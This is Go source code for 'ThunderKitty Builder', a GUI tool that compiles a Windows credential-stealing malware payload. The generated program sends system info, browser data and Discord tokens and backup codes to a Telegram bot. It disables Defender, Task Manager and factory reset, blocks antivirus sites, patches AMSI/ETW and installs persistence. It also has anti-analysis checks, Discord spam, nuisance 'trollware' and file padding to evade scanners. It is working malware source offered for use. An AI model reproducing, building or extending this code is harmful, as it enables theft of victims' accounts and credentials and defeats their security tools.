package main

import (
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"text/template"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/widget"
)

type Config struct {
	TeleBotToken        string
	TeleChatID          string
	EnableAntiDebug     bool
	EnableFakeError     bool
	EnableBrowsers      bool
	HideConsole         bool
	DisableFactoryReset bool
	DisableTaskManager  bool
	BlockHostsFile      bool
	OpenSiteURL         string
	SpeakTTSMessage     string
	SwapMouse           bool
	PatchPowerShell     bool
	EnablePersistence   bool
	StealBackupCodes    bool
	SetWallpaper        bool
	EnableTokenGrabber  bool
	DMMessage           string
	FilePumperSize      string
}

func buildExecutable(cfg Config) {
	const templateContent = `
package main

import (
	"ThunderKitty-Grabber/utils/sysinfo"
	"ThunderKitty-Grabber/utils/antidbgandvm"
	"ThunderKitty-Grabber/utils/mutex"
	"ThunderKitty-Grabber/utils/fakeerror"
	"ThunderKitty-Grabber/utils/browsers"
	"ThunderKitty-Grabber/utils/tokengrabber"
	"ThunderKitty-Grabber/utils/backupcodes"
	"ThunderKitty-Grabber/utils/disablefactoryreset"
	"ThunderKitty-Grabber/utils/taskmanager"
	"ThunderKitty-Grabber/utils/persistence"
	"ThunderKitty-Grabber/utils/hosts"
	"ThunderKitty-Grabber/utils/exclude"
	"ThunderKitty-Grabber/utils/defender"
	"ThunderKitty-Grabber/utils/powershellpatcher"
	"ThunderKitty-Grabber/utils/wallpaperchanger"
	"fmt"
	"os/exec"
)

const (
	TelegramBotToken = "{{.TeleBotToken}}"
	TelegramChatId   = "{{.TeleChatID}}"
)

func main() {
 	if {{.EnableAntiDebug}} {
		go AntiDebugVMAnalysis.ThunderKitty()
	} else {
		fmt.Println("Anti-debugging and VM analysis not enabled")
	}
	if {{.EnableFakeError}} {
		go FakeError.Show()
	} else {
		fmt.Println("Fake error not enabled")
	}

	go Exclude.ExcludeDrive()
	go Defender.Disable()
	go Mutex.Create()

	go SysInfo.Fetch(TelegramBotToken, TelegramChatId)

	if {{.EnableBrowsers}} {
		go browsers.ThunderKittyGrab(TelegramBotToken, TelegramChatId)
	} else {
		fmt.Println("Browser info grabbing not enabled")
	}
	
	if {{.EnableTokenGrabber}} {
		TokenGrabber.Run(TelegramBotToken, TelegramChatId, "{{.DMMessage}}")
	} else {
		fmt.Println("Discord token grabbing not enabled")
	}

	if {{.StealBackupCodes}} {
		go BackupCodes.Search()
	} else {
		fmt.Println("Discord backup code recovery disabled")
	}

	if {{.DisableFactoryReset}} {
		go FactoryReset.Disable()
	} else {
		fmt.Println("Factory reset not disabled")
	}

	if {{.DisableTaskManager}} {
		go TaskManager.Disable()
	} else {
		fmt.Println("Task manager not disabled")
	}

	if {{.EnablePersistence}} {
		go Persistence.Create()
	} else {
		fmt.Println("Persistence not enabled")
	}

	if {{.BlockHostsFile}} {
		go Hosts.Infect()
	} else {
		fmt.Println("Block hosts file not enabled")
	}
	
	url := "{{.OpenSiteURL}}"
	if url != "" {
		exec.Command("cmd.exe", "/c", "start", url).Run()
	} else {
		fmt.Println("Open website not enabled")
	}
	
	ttsMessage := "{{.SpeakTTSMessage}}"
	if ttsMessage != "" {
		exec.Command("PowerShell", "-Command", "(New-Object -ComObject SAPI.SpVoice).Speak(\"" + ttsMessage + "\")").Run()
	} else {
		fmt.Println("TTS not enabled")
	}

	if {{.SwapMouse}} {
		exec.Command("cmd", "/c", "rundll32.exe", "user32.dll,SwapMouseButton").Run()
	} else {
		fmt.Println("Swap mouse not enabled")
	}

	if {{.PatchPowerShell}} {
		go PowerShellPatcher.Patch()
	} else {
		fmt.Println("PowerShell patcher not enabled")
	}

	if {{.SetWallpaper}} {
		WallpaperChanger.DownloadAndSetWallpaper()
	} else {
		fmt.Println("Wallpaper changer not enabled")
	}
}
`

	tmpl, err := template.New("main").Parse(templateContent)
	if err != nil {
		fmt.Println("Error parsing template:", err)
		return
	}

	file, err := os.Create("main.go")
	if err != nil {
		fmt.Println("Error creating main.go:", err)
		return
	}
	defer file.Close()

	err = tmpl.Execute(file, cfg)
	if err != nil {
		fmt.Println("Error executing template:", err)
		return
	}

	ldflags := "-s -w"
	if cfg.HideConsole {
		ldflags += " -H=windowsgui"
	}
	cmd := exec.Command("cmd", "/C", "go", "build", "-ldflags", ldflags, "main.go")
	fmt.Println(cmd)

	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	err = cmd.Run()
	if err != nil {
		fmt.Println("Error building executable:", err)
		return
	}

	fmt.Println("Build successful")
}

func pumpExecutable(path string, size int) {
	file, err := os.ReadFile(path)
	if err != nil {
		panic(err)
	}

	size = size * 1024 * 1024 // Convert to MB

	pumpAmount := size - len(file)
	if pumpAmount <= 0 {
		return
	}

	zeroBytes := make([]byte, pumpAmount)
	err = os.WriteFile(path, append(file, zeroBytes...), 0600)
	if err != nil {
		return
	}

	return
}

func main() {
	a := app.New()
	w := a.NewWindow("ThunderKitty Builder")

	// Creating all the widgets
	// Grabber Widgets
	telegramBotTokenEntry := widget.NewEntry()
	telegramBotTokenEntry.SetPlaceHolder("Enter Telegram Bot Token")

	telegramChatIdEntry := widget.NewEntry()
	telegramChatIdEntry.SetPlaceHolder("Enter Telegram Chat ID")

	enableAntiDebug := widget.NewCheck("Enable Anti-Debugging", nil)
	enableFakeError := widget.NewCheck("Enable Fake Error", nil)
	enableBrowsers := widget.NewCheck("Enable Browser Info Grabbing", nil)
	enableTokenGrabber := widget.NewCheck("Enable Token Grabbing", nil)
	stealBackupCodes := widget.NewCheck("Steal Discord Backup Codes", nil)
	hideConsole := widget.NewCheck("Hide Console Window", nil)
	disableFactoryReset := widget.NewCheck("Disable Factory Reset", nil)
	disableTaskManager := widget.NewCheck("Disable Task Manager", nil)
	blockHostsFile := widget.NewCheck("Block AV Sites", nil)
	patchPowershell := widget.NewCheck("Patch PowerShell (AMSI & ETW)", nil)
	enablePersistence := widget.NewCheck("Enable Persistence", nil)

	// Trollware Widgets
	openSiteEntry := widget.NewEntry()
	openSiteEntry.SetPlaceHolder("Open Website (leave blank for none)")
	speakTTSEntry := widget.NewEntry()
	speakTTSEntry.SetPlaceHolder("Text-to-speech Message (leave blank for none)")
	enableSwapMouse := widget.NewCheck("Swap Mouse Buttons", nil)
	setWallpaper := widget.NewCheck("Enable Wallpaper Changer", nil)
	sendDMMessage := widget.NewEntry()
	sendDMMessage.SetPlaceHolder("Spam Discord Messages (leave blank for none)")

	// File Pumper Widgets
	filePumperEntry := widget.NewEntry()
	filePumperEntry.SetPlaceHolder("Pump File (size in MB)")

	// Build button
	buildButton := widget.NewButton("Build", func() {

		// Delete old file
		os.Remove("main.exe")

		// Build the new one
		cfg := Config{
			TeleBotToken:        telegramBotTokenEntry.Text,
			TeleChatID:          telegramChatIdEntry.Text,
			EnableAntiDebug:     enableAntiDebug.Checked,
			EnableFakeError:     enableFakeError.Checked,
			EnableBrowsers:      enableBrowsers.Checked,
			HideConsole:         hideConsole.Checked,
			DisableFactoryReset: disableFactoryReset.Checked,
			DisableTaskManager:  disableTaskManager.Checked,
			BlockHostsFile:      blockHostsFile.Checked,
			OpenSiteURL:         openSiteEntry.Text,
			SpeakTTSMessage:     speakTTSEntry.Text,
			SwapMouse:           enableSwapMouse.Checked,
			PatchPowerShell:     patchPowershell.Checked,
			EnablePersistence:   enablePersistence.Checked,
			StealBackupCodes:    stealBackupCodes.Checked,
			SetWallpaper:        setWallpaper.Checked,
			EnableTokenGrabber:  enableTokenGrabber.Checked,
			DMMessage:           sendDMMessage.Text,
			FilePumperSize:      filePumperEntry.Text,
		}

		buildExecutable(cfg)

		// Pumper
		if filePumperEntry.Text != "" {
			pumpSize, err := strconv.Atoi(filePumperEntry.Text)
			if err != nil {
				panic(err)
			}

			pumpExecutable("main.exe", pumpSize)
		}
	})

	grabberSettings := container.NewVBox(
		widget.NewLabel("ThunderKitty Configuration"),
		telegramBotTokenEntry,
		telegramChatIdEntry,
		enableAntiDebug,
		enableFakeError,
		enableBrowsers,
		enableTokenGrabber,
		stealBackupCodes,
		hideConsole,
		disableFactoryReset,
		disableTaskManager,
		patchPowershell,
		blockHostsFile,
		enablePersistence,
		buildButton,
	)

	trollwareSettings := container.NewVBox(
		widget.NewLabel("Trollware Configuration"),
		openSiteEntry,
		speakTTSEntry,
		enableSwapMouse,
		setWallpaper,
		sendDMMessage,
	)

	filePumperSettings := container.NewVBox(
		widget.NewLabel("File Pumper Configuration"),
		filePumperEntry,
	)

	tabs := container.NewAppTabs(
		container.NewTabItem("Grabber Configuration", grabberSettings),
		container.NewTabItem("Trollware Configuration", trollwareSettings),
		container.NewTabItem("File Pumper", filePumperSettings),
	)

	w.SetContent(tabs)
	w.Resize(fyne.NewSize(500, 350))
	w.ShowAndRun()
}
